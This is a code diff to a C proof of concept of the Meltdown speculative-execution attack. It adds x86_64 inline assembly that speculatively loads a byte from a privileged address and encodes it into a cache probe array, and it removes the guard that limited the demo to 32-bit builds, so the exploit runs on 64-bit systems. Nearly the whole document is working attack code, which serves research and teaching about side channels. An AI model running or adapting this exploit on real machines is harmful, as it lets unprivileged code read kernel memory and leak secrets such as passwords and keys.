@@ -11,7 +11,29 @@ static size_t phys = 0;
 static int CACHE_MISS_THRESHOLD = 0;
 
 
-#define meltdown                                                               \
+static void  __attribute__((noinline)) meltdown()
+{
+#ifdef __x86_64__
+	asm volatile (
+		"1:\n\t"
+
+		".rept 300\n\t"
+		"add $0x141, %%rax\n\t"
+		".endr\n\t"
+
+		"movzx (%[addr]), %%eax\n\t"
+		"shl $12, %%rax\n\t"
+		"jz 1b\n\t"
+		"movzx (%[target], %%rax, 1), %%rbx\n"
+
+		"stopspeculate: \n\t"
+		"nop\n\t"
+		:
+		: [target] "r" (mem),
+		  [addr] "r" (phys)
+		: "rax", "rbx"
+	);
+#else /* ifdef __x86_64__ */                                                            \
   asm volatile("xorl %%eax, %%eax\n"                                           \
                "1:\n"                                                          \
                "movb (%%ecx), %%al\n"                                          \
@@ -21,6 +43,9 @@ static int CACHE_MISS_THRESHOLD = 0;
                :                                                               \
                : "c"(phys), "b"(mem)                                           \
                : "eax");
+#endif
+}
+
 
 static inline void maccess(void *p) {
     asm volatile("movl (%0), %%eax\n" : : "c"(p) : "eax");
@@ -90,7 +115,7 @@ int testRead() {
     
     // Run only once.
     while (retries--) {
-        meltdown;
+        meltdown();
         
         int i;
         for (i = 0; i < 256; i++) {
@@ -154,9 +179,9 @@ int cleanup() {
 }
 
 int main() {
-    #if defined(__x86_64__)
-        printf("Use 32bits mode to compile me, please!\n");
-    #else // i386
+    // #if defined(__x86_64__)
+    //     printf("Use 32bits mode to compile me, please!\n");
+    // #else // i386
         printf("Running...\n");
 
         char *name = "Johnny Kuo";
@@ -175,7 +200,7 @@ int main() {
 
         cleanup();
         printf("\n");
-    #endif
+    // #endif
   
     return 0;
 }
